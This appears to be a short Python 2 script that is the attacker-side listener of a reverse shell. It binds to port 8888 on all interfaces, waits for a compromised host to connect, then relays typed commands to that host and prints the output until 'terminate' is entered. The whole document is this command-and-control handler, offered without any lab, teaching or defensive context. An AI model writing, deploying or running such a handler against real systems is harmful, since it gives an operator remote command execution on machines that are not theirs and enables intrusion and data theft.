import socket
def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s.bind(("0.0.0.0", 8888))                          
    s.listen(1)                                         
    
    print '[+] Listening for incoming TCP connection'
    print '[+] Shell Is running'
    conn, addr = s.accept()     
    
    print '[+] We got a connection from: ', addr  
    while True: 
        command = raw_input("Shell> ") 
        print command
        if 'terminate' in command:       
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)    
            print conn.recv(100000) 
def main ():
    connect()
main()